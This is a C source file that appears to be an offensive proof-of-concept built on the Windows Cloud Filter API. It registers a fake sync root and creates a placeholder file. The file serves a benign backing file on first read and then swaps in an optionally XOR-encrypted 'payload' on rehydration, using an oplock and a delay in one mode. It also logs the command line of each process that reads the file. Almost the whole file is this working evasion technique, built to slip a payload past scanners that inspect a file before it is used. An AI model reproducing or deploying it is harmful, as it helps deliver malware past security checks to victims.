#include "common.h"
#include <shlwapi.h>

/* ================================================================
 *  Cloud Filter API types — manually defined to match cfapi.h
 * ================================================================ */

#define CF_CALLBACK_TYPE_FETCH_DATA          0
#define CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS  3
#define CF_CALLBACK_TYPE_NONE               (-1)
#define CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO    2
#define CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH  4
#define CF_HYDRATION_POLICY_FULL             2
#define CF_HYDRATION_POLICY_MODIFIER_STREAMING  2
#define CF_POPULATION_POLICY_PARTIAL         0
#define CF_PROVIDER_STATUS_IDLE              1
#define CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC  2
#define CF_OPERATION_TYPE_TRANSFER_DATA       0
#define CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS 4
#define CF_OPERATION_TRANSFER_PH_DISABLE_ON_DEMAND 2
#define MY_FILE_ATTRIBUTE_ARCHIVE            0x00000020
#define STATUS_END_OF_FILE                   ((LONG)0xC0000011)

#pragma pack(push, 8)

typedef struct { USHORT primary; USHORT modifier; } CF_HYDRATION_POLICY;
typedef struct { USHORT primary; USHORT modifier; } CF_POPULATION_POLICY;

typedef struct {
    ULONG struct_size;
    CF_HYDRATION_POLICY  hydration;
    CF_POPULATION_POLICY population;
    ULONG in_sync;
    LONG  hard_link;
    LONG  placeholder_management;
} CF_SYNC_POLICIES;

typedef struct {
    ULONG  struct_size;
    PWSTR  provider_name;
    PWSTR  provider_version;
    const void *sync_root_identity;
    ULONG  sync_root_identity_length;
    const void *file_identity;
    ULONG  file_identity_length;
    GUID   provider_id;
} CF_SYNC_REGISTRATION;

typedef struct {
    LONGLONG creation_time;
    LONGLONG last_access_time;
    LONGLONG last_write_time;
    LONGLONG change_time;
    ULONG    file_attributes;
} FILE_BASIC_INFO_CF;

typedef struct {
    FILE_BASIC_INFO_CF basic_info;
    LONGLONG file_size;
} CF_FS_METADATA;

typedef struct {
    PWSTR        relative_file_name;
    CF_FS_METADATA fs_metadata;
    const void  *file_identity;
    ULONG        file_identity_length;
    LONG         flags;
    ULONG        result;
    LONGLONG     create_usn;
} CF_PLACEHOLDER_CREATE_INFO;

typedef struct {
    ULONG struct_size;
    ULONG process_id;
    PWSTR image_path;
    PWSTR package_name;
    PWSTR application_id;
    PWSTR command_line;
    ULONG session_id;
} CF_PROCESS_INFO;

typedef struct {
    ULONG  struct_size;
    LONGLONG connection_key;
    void  *callback_context;
    PWSTR  volume_guid_name;
    PWSTR  volume_dos_name;
    ULONG  volume_serial_number;
    LONGLONG sync_root_file_id;
    const void *sync_root_identity;
    ULONG  sync_root_identity_length;
    LONGLONG file_id;
    LONGLONG file_size;
    const void *file_identity;
    ULONG  file_identity_length;
    PWSTR  normalized_path;
    LONGLONG transfer_key;
    BYTE   priority_hint;
    void  *correlation_vector;
    CF_PROCESS_INFO *process_info;
    LONGLONG request_key;
} CF_CALLBACK_INFO;

typedef struct { BYTE version; char vector[129]; } MY_CORRELATION_VECTOR;
typedef struct { ULONG s; ULONG c; ULONG do_; ULONG dl; ULONG dio; ULONG dil; } CF_SYNC_STATUS;

typedef struct {
    ULONG  struct_size;
    LONG   op_type;
    LONGLONG connection_key;
    LONGLONG transfer_key;
    const MY_CORRELATION_VECTOR *correlation_vector;
    const CF_SYNC_STATUS     *sync_status;
    LONGLONG request_key;
} CF_OPERATION_INFO;

typedef struct {
    LONG     flags;
    LONG     completion_status;
    const void *buffer;
    LONGLONG offset;
    LONGLONG length;
} CF_OP_TRANSFER_DATA;

typedef struct {
    LONG     flags;
    LONG     completion_status;
    LONGLONG placeholder_total_count;
    CF_PLACEHOLDER_CREATE_INFO *placeholder_array;
    ULONG    placeholder_count;
    ULONG    entries_processed;
} CF_OP_TRANSFER_PLACEHOLDERS;

typedef struct {
    ULONG param_size;
    union {
        CF_OP_TRANSFER_DATA         transfer_data;
        CF_OP_TRANSFER_PLACEHOLDERS transfer_placeholders;
    };
} CF_OPERATION_PARAMETERS;

typedef struct {
    ULONG param_size;
    union {
        struct {
            ULONG  Flags;
            LPCWSTR Pattern;
        } FetchPlaceholders;
        struct {
            ULONG    Flags;
            LONGLONG RequiredFileOffset;
            LONGLONG RequiredLength;
            LONGLONG OptionalFileOffset;
            LONGLONG OptionalLength;
        } FetchData;
    };
} MY_CF_CALLBACK_PARAMETERS;

typedef void (CALLBACK *CF_CALLBACK_FN)(
    const CF_CALLBACK_INFO *, const MY_CF_CALLBACK_PARAMETERS *);

typedef struct {
    LONG          callback_type;
    CF_CALLBACK_FN callback;
} CF_CALLBACK_REGISTRATION;

#pragma pack(pop)

/* function pointer types */
typedef HRESULT (WINAPI *pfnCfRegisterSyncRoot)(LPCWSTR, const CF_SYNC_REGISTRATION*, const CF_SYNC_POLICIES*, ULONG);
typedef HRESULT (WINAPI *pfnCfUnregisterSyncRoot)(LPCWSTR);
typedef HRESULT (WINAPI *pfnCfConnectSyncRoot)(LPCWSTR, const CF_CALLBACK_REGISTRATION*, void*, ULONG, LONGLONG*);
typedef HRESULT (WINAPI *pfnCfDisconnectSyncRoot)(LONGLONG);
typedef HRESULT (WINAPI *pfnCfCreatePlaceholders)(LPCWSTR, CF_PLACEHOLDER_CREATE_INFO*, ULONG, ULONG, ULONG*);
typedef HRESULT (WINAPI *pfnCfUpdateSyncProviderStatus)(LONGLONG, ULONG);
typedef HRESULT (WINAPI *pfnCfOpenFileWithOplock)(LPCWSTR, ULONG, HANDLE*);
typedef HANDLE  (WINAPI *pfnCfGetWin32HandleFromProtectedHandle)(HANDLE);
typedef HRESULT (WINAPI *pfnCfDehydratePlaceholder)(HANDLE, LONGLONG, LONGLONG, ULONG, LPOVERLAPPED);
typedef HRESULT (WINAPI *pfnCfExecute)(const CF_OPERATION_INFO*, CF_OPERATION_PARAMETERS*);
typedef void    (WINAPI *pfnCfCloseHandle)(HANDLE);
typedef void    (WINAPI *pfnCfReleaseProtectedHandle)(HANDLE);

/* ================================================================
 *  Global state
 * ================================================================ */
static char    g_sync_root[MAX_PATH];
static char    g_ph_name[MAX_PATH];
static BYTE   *g_backing[2];
static size_t  g_backing_sz[2];
static size_t  g_placeholder_size;
static volatile LONG g_index;   /* 0 or 1 */
static char    g_key[256];
static int     g_mode;
static HMODULE g_cldapi;

static HMODULE cld(void)
{
    if (!g_cldapi) {
        g_cldapi = LoadLibraryA("CldApi.dll");
        if (!g_cldapi) { printf("[x] DLL CldApi.dll not found.\n"); }
    }
    return g_cldapi;
}

/* return decrypted copy if index==1 && key set, else raw pointer (caller frees if needed) */
static BYTE *get_backing_content(int *need_free)
{
    LONG idx = InterlockedCompareExchange(&g_index, g_index, g_index);
    *need_free = 0;
    if (idx == 1 && g_key[0]) {
        BYTE *copy = (BYTE *)malloc(g_backing_sz[1]);
        memcpy(copy, g_backing[1], g_backing_sz[1]);
        xor_crypt(copy, g_backing_sz[1], (const BYTE *)g_key, strlen(g_key));
        *need_free = 1;
        return copy;
    }
    return g_backing[idx];
}

static size_t get_backing_len(void)
{
    LONG idx = InterlockedCompareExchange(&g_index, g_index, g_index);
    return g_backing_sz[idx];
}

static void toggle_index(void) { InterlockedXor(&g_index, 1); }

/* ================================================================
 *  CfExecute wrapper
 * ================================================================ */
static HRESULT cf_execute(const CF_OPERATION_INFO *oi, CF_OPERATION_PARAMETERS *op)
{
    pfnCfExecute pExec = (pfnCfExecute)GetProcAddress(cld(), "CfExecute");
    if (!pExec) return E_FAIL;
    return pExec(oi, op);
}

/* ================================================================
 *  Callbacks
 * ================================================================ */
static void CALLBACK fetch_placeholders_cb(
    const CF_CALLBACK_INFO *info,
    const MY_CF_CALLBACK_PARAMETERS *params)
{
    HMODULE hShlw = LoadLibraryA("shlwapi.dll");
    typedef BOOL (WINAPI *pfnPathMatchSpecW)(LPCWSTR, LPCWSTR);
    pfnPathMatchSpecW pMatch = hShlw ?
        (pfnPathMatchSpecW)GetProcAddress(hShlw, "PathMatchSpecW") : NULL;

    wchar_t *pattern_w = NULL;
    const wchar_t *pat = params->FetchPlaceholders.Pattern;
    if (!pat || !pat[0]) {
        pattern_w = str_to_wide("*");
        pat = pattern_w;
    }

    wchar_t *name_w = str_to_wide(g_ph_name);
    BOOL matches = pMatch ? pMatch(name_w, pat) : TRUE;
    if (pattern_w) free(pattern_w);

    CF_OPERATION_INFO oi = {0};
    oi.struct_size    = sizeof(oi);
    oi.op_type        = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
    oi.connection_key = info->connection_key;
    oi.transfer_key   = info->transfer_key;
    oi.correlation_vector = (const MY_CORRELATION_VECTOR *)info->correlation_vector;
    oi.request_key    = info->request_key;

    CF_OPERATION_PARAMETERS op = {0};
    op.param_size = sizeof(op);
    op.transfer_placeholders.flags = CF_OPERATION_TRANSFER_PH_DISABLE_ON_DEMAND;
    op.transfer_placeholders.completion_status = 0;
    op.transfer_placeholders.placeholder_total_count = 1;
    op.transfer_placeholders.entries_processed = 1;

    if (matches) {
        CF_PLACEHOLDER_CREATE_INFO pc = {0};
        pc.relative_file_name = name_w;
        pc.fs_metadata.basic_info.file_attributes = MY_FILE_ATTRIBUTE_ARCHIVE;
        pc.fs_metadata.file_size = (LONGLONG)get_backing_len();
        char identity[256];
        int id_len = snprintf(identity, sizeof(identity), "sync:%s", g_ph_name);
        pc.file_identity = identity;
        pc.file_identity_length = (ULONG)id_len;
        pc.flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
        op.transfer_placeholders.placeholder_array = &pc;
        op.transfer_placeholders.placeholder_count = 1;
        cf_execute(&oi, &op);
    } else {
        op.transfer_placeholders.placeholder_array = NULL;
        op.transfer_placeholders.placeholder_count = 0;
        cf_execute(&oi, &op);
    }
    free(name_w);
}

static int do_transfer_data(const CF_CALLBACK_INFO *info,
                            const MY_CF_CALLBACK_PARAMETERS *params)
{
    LONGLONG req_off = params->FetchData.RequiredFileOffset;
    LONGLONG req_len = params->FetchData.RequiredLength;
    LONGLONG send_len;

    if (req_off >= (LONGLONG)g_placeholder_size)
        send_len = 0;
    else {
        LONGLONG max = (LONGLONG)g_placeholder_size - req_off;
        send_len = (max < req_len) ? max : req_len;
    }

    printf("\n[-] Fetch Data operation received:\n");
    printf("[-] Required offset: %lld\n", req_off);
    printf("[-] Required length: %lld\n", req_len);
    printf("[-] Bytes to send: %lld\n", send_len);

    if (info->process_info) {
        char *img = wide_to_str(info->process_info->image_path, -1);
        char *cmd = wide_to_str(info->process_info->command_line, -1);
        printf("[-] Process command line: '%s' --- PID: %lu\n",
               (cmd && cmd[0]) ? cmd : (img ? img : "?"),
               info->process_info->process_id);
        free(img); free(cmd);
    }

    CF_OPERATION_INFO oi = {0};
    oi.struct_size    = sizeof(oi);
    oi.op_type        = CF_OPERATION_TYPE_TRANSFER_DATA;
    oi.connection_key = info->connection_key;
    oi.transfer_key   = info->transfer_key;
    oi.correlation_vector = (const MY_CORRELATION_VECTOR *)info->correlation_vector;

    CF_OPERATION_PARAMETERS op = {0};
    op.param_size = sizeof(op);
    op.transfer_data.offset = req_off;

    if (send_len > 0) {
        BYTE *buf = (BYTE *)calloc(1, (size_t)send_len);
        int need_free = 0;
        BYTE *backing = get_backing_content(&need_free);
        size_t backing_len = get_backing_len();
        size_t start = (size_t)req_off;
        if (start < backing_len) {
            size_t end = start + (size_t)send_len;
            if (end > backing_len) end = backing_len;
            memcpy(buf, backing + start, end - start);
        }
        if (need_free) free(backing);

        op.transfer_data.buffer = buf;
        op.transfer_data.length = send_len;
        op.transfer_data.completion_status = 0;
        HRESULT hr = cf_execute(&oi, &op);
        free(buf);

        if (FAILED(hr)) {
            printf("[x] Hydration process failed. HRESULT: %lx\n", (unsigned long)hr);
            return 0;
        }
    } else {
        op.transfer_data.completion_status =
            (req_off >= (LONGLONG)g_placeholder_size) ? STATUS_END_OF_FILE : 0;
        cf_execute(&oi, &op);
    }
    return 1;
}

static void CALLBACK fetch_data_cb(
    const CF_CALLBACK_INFO *info,
    const MY_CF_CALLBACK_PARAMETERS *params)
{
    int ok = do_transfer_data(info, params);

    if (ok && g_mode == 2) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\%s", g_sync_root, g_ph_name);
        wchar_t *wpath = str_to_wide(path);

        pfnCfOpenFileWithOplock pOpen =
            (pfnCfOpenFileWithOplock)GetProcAddress(cld(), "CfOpenFileWithOplock");
        pfnCfCloseHandle pClose =
            (pfnCfCloseHandle)GetProcAddress(cld(), "CfCloseHandle");
        if (!pOpen) { free(wpath); goto menu; }

        HANDLE ph = NULL;
        HRESULT hr = pOpen(wpath, 0, &ph);
        free(wpath);
        if (FAILED(hr)) {
            printf("[x] Call to CfOpenFileWithOplock failed. HRESULT: %lx\n",
                   (unsigned long)hr);
            goto menu;
        }

        toggle_index();
        printf("[-] Waiting 10 seconds before second hydration...\n");
        Sleep(10000);

        printf("[-] Starting second rehydration!\n");
        do_transfer_data(info, params);

        pClose(ph);
    }

menu:
    printf("-----------------------------------------------------\n");
    printf("[**] Select an option [**]\n");
    printf("1) Dehydrate Placeholder\n");
    printf("2) Unsync and Exit\n");
    printf("> ");
    fflush(stdout);
}

/* ================================================================
 *  API wrappers
 * ================================================================ */
static int register_sync_root(void)
{
    if (!cld()) return 0;
    pfnCfRegisterSyncRoot pReg =
        (pfnCfRegisterSyncRoot)GetProcAddress(cld(), "CfRegisterSyncRoot");

    wchar_t prov_name[] = L"RandomProviderName";
    wchar_t prov_ver[]  = L"1.0";

    CF_SYNC_REGISTRATION reg = {0};
    reg.struct_size = sizeof(reg);
    reg.provider_name = prov_name;
    reg.provider_version = prov_ver;
    reg.sync_root_identity = prov_name;
    reg.sync_root_identity_length = (ULONG)(wcslen(prov_name) + 1) * 2;
    reg.provider_id.Data1 = 0x12345678;
    reg.provider_id.Data2 = 0x9abc;
    reg.provider_id.Data3 = 0xdef0;

    CF_SYNC_POLICIES pol = {0};
    pol.struct_size = sizeof(pol);
    pol.hydration.primary  = CF_HYDRATION_POLICY_FULL;
    pol.hydration.modifier = CF_HYDRATION_POLICY_MODIFIER_STREAMING;
    pol.population.primary = CF_POPULATION_POLICY_PARTIAL;
    pol.placeholder_management = 1;

    wchar_t *root_w = str_to_wide(g_sync_root);
    HRESULT hr = pReg(root_w, &reg, &pol, 0);
    free(root_w);
    if (FAILED(hr)) {
        printf("[x] Call to CfRegisterSyncRoot failed. HRESULT: %lx\n",
               (unsigned long)hr);
        return 0;
    }
    printf("[+] Sync root successfully registered.\n");
    return 1;
}

static int unregister_sync_root(void)
{
    if (!cld()) return 0;
    pfnCfUnregisterSyncRoot pUnreg =
        (pfnCfUnregisterSyncRoot)GetProcAddress(cld(), "CfUnregisterSyncRoot");
    wchar_t *root_w = str_to_wide(g_sync_root);
    HRESULT hr = pUnreg(root_w);
    free(root_w);
    if (FAILED(hr)) {
        printf("[x] Call to CfUnregisterSyncRoot failed. HRESULT: %lx\n",
               (unsigned long)hr);
        return 0;
    }
    printf("[+] Sync root successfully removed.\n");
    return 1;
}

static LONGLONG connect_sync_root(void)
{
    if (!cld()) return 0;
    pfnCfConnectSyncRoot pConn =
        (pfnCfConnectSyncRoot)GetProcAddress(cld(), "CfConnectSyncRoot");

    CF_CALLBACK_REGISTRATION table[3];
    table[0].callback_type = CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS;
    table[0].callback      = fetch_placeholders_cb;
    table[1].callback_type = CF_CALLBACK_TYPE_FETCH_DATA;
    table[1].callback      = fetch_data_cb;
    table[2].callback_type = CF_CALLBACK_TYPE_NONE;
    table[2].callback      = NULL;

    wchar_t *root_w = str_to_wide(g_sync_root);
    LONGLONG ck = 0;
    HRESULT hr = pConn(root_w, table, NULL,
        CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH,
        &ck);
    free(root_w);
    if (FAILED(hr)) {
        printf("[x] Call to CfConnectSyncRoot failed. HRESULT: %lx\n",
               (unsigned long)hr);
        return 0;
    }
    printf("[+] Connection to sync root established. Connection key: 0x%llx\n", ck);
    return ck;
}

static void disconnect_sync_root(LONGLONG ck)
{
    if (!cld()) return;
    pfnCfDisconnectSyncRoot pDisc =
        (pfnCfDisconnectSyncRoot)GetProcAddress(cld(), "CfDisconnectSyncRoot");
    HRESULT hr = pDisc(ck);
    if (FAILED(hr))
        printf("[x] Call to CfDisconnectSyncRoot failed. HRESULT: %lx\n",
               (unsigned long)hr);
    else
        printf("[+] Successfully disconnected from sync root.\n");
}

static int create_placeholder(void)
{
    if (!cld()) return 0;
    pfnCfCreatePlaceholders pCreate =
        (pfnCfCreatePlaceholders)GetProcAddress(cld(), "CfCreatePlaceholders");

    wchar_t *name_w = str_to_wide(g_ph_name);
    wchar_t *root_w = str_to_wide(g_sync_root);

    CF_PLACEHOLDER_CREATE_INFO pc = {0};
    pc.relative_file_name = name_w;
    pc.fs_metadata.basic_info.file_attributes = MY_FILE_ATTRIBUTE_ARCHIVE;
    pc.fs_metadata.file_size = (LONGLONG)g_placeholder_size;
    pc.file_identity = name_w;
    pc.file_identity_length = (ULONG)(wcslen(name_w) + 1) * 2;
    pc.flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;

    ULONG entries = 0;
    HRESULT hr = pCreate(root_w, &pc, 1, 0, &entries);
    free(name_w); free(root_w);

    if (FAILED(hr) || entries == 0) {
        printf("[x] Call to CfCreatePlaceholders failed. HRESULT: %lx\n",
               (unsigned long)hr);
        return 0;
    }
    printf("[+] Placeholder created: %s\\%s\n", g_sync_root, g_ph_name);
    return 1;
}

static int set_idle(LONGLONG ck)
{
    if (!cld()) return 0;
    pfnCfUpdateSyncProviderStatus pUpd =
        (pfnCfUpdateSyncProviderStatus)GetProcAddress(cld(),
            "CfUpdateSyncProviderStatus");
    HRESULT hr = pUpd(ck, CF_PROVIDER_STATUS_IDLE);
    if (FAILED(hr)) {
        printf("[x] Call to CfUpdateSyncProviderStatus failed. HRESULT: %lx\n",
               (unsigned long)hr);
        return 0;
    }
    printf("[+] Provider status set to CF_PROVIDER_STATUS_IDLE.\n");
    return 1;
}

static void dehydrate_file(void)
{
    if (!cld()) return;
    pfnCfOpenFileWithOplock pOpen =
        (pfnCfOpenFileWithOplock)GetProcAddress(cld(), "CfOpenFileWithOplock");
    pfnCfGetWin32HandleFromProtectedHandle pGetH =
        (pfnCfGetWin32HandleFromProtectedHandle)GetProcAddress(cld(),
            "CfGetWin32HandleFromProtectedHandle");
    pfnCfDehydratePlaceholder pDehy =
        (pfnCfDehydratePlaceholder)GetProcAddress(cld(),
            "CfDehydratePlaceholder");
    pfnCfReleaseProtectedHandle pRelease =
        (pfnCfReleaseProtectedHandle)GetProcAddress(cld(),
            "CfReleaseProtectedHandle");
    pfnCfCloseHandle pClose =
        (pfnCfCloseHandle)GetProcAddress(cld(), "CfCloseHandle");

    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s\\%s", g_sync_root, g_ph_name);
    wchar_t *wpath = str_to_wide(path);

    HANDLE ph = NULL;
    HRESULT hr = pOpen(wpath, 0, &ph);
    free(wpath);
    if (FAILED(hr)) {
        printf("[x] Call to CfOpenFileWithOplock failed. HRESULT: %lx\n",
               (unsigned long)hr);
        return;
    }

    HANDLE fh = pGetH(ph);
    hr = pDehy(fh, 0, -1, 0, NULL);
    printf("[-] Call to CfDehydratePlaceholder returned: %lx\n",
           (unsigned long)hr);

    pRelease(fh);
    pClose(ph);
    toggle_index();
}

/* ================================================================
 *  main
 * ================================================================ */
int main(void)
{
    char bf1[MAX_PATH], bf2[MAX_PATH];
    prompt("Sync root directory: ",                  g_sync_root, sizeof(g_sync_root));
    prompt("Backing file 1 (benign file): ",         bf1, sizeof(bf1));
    prompt("Backing file 2 (payload): ",             bf2, sizeof(bf2));
    prompt("Placeholder name: ",                     g_ph_name, sizeof(g_ph_name));
    prompt("Decryption key (empty = unencrypted): ", g_key, sizeof(g_key));

    char mode_s[8];
    prompt("Select mode (1 or 2): ", mode_s, sizeof(mode_s));
    g_mode = atoi(mode_s);
    if (g_mode != 1 && g_mode != 2) {
        printf("[x] Invalid mode. Must be 1 or 2.\n");
        return 1;
    }

    g_backing[0] = read_file_bytes(bf1, &g_backing_sz[0]);
    if (!g_backing[0]) { printf("[x] Error reading %s\n", bf1); return 1; }
    g_backing[1] = read_file_bytes(bf2, &g_backing_sz[1]);
    if (!g_backing[1]) { printf("[x] Error reading %s\n", bf2); return 1; }
    g_placeholder_size = g_backing_sz[0];
    g_index = 0;

    if (!register_sync_root()) return 1;

    LONGLONG ck = connect_sync_root();
    if (!ck) { unregister_sync_root(); return 1; }

    if (!create_placeholder()) {
        disconnect_sync_root(ck);
        unregister_sync_root();
        return 1;
    }

    if (!set_idle(ck)) {
        disconnect_sync_root(ck);
        unregister_sync_root();
        return 1;
    }

    /* menu loop */
    printf("-----------------------------------------------------\n");
    printf("[**] Select an option [**]\n");
    printf("1) Dehydrate Placeholder\n");
    printf("2) Unsync and Exit\n");
    printf("> ");
    fflush(stdout);

    for (;;) {
        char line[16];
        if (!fgets(line, sizeof(line), stdin)) break;
        trim(line);
        if (strcmp(line, "1") == 0) {
            dehydrate_file();
            printf("-----------------------------------------------------\n");
            printf("[**] Select an option [**]\n");
            printf("1) Dehydrate Placeholder\n");
            printf("2) Unsync and Exit\n");
            printf("> ");
            fflush(stdout);
        } else if (strcmp(line, "2") == 0) {
            break;
        } else {
            printf("[x] Invalid option.\n> ");
            fflush(stdout);
        }
    }

    disconnect_sync_root(ck);
    unregister_sync_root();

    free(g_backing[0]);
    free(g_backing[1]);
    return 0;
}
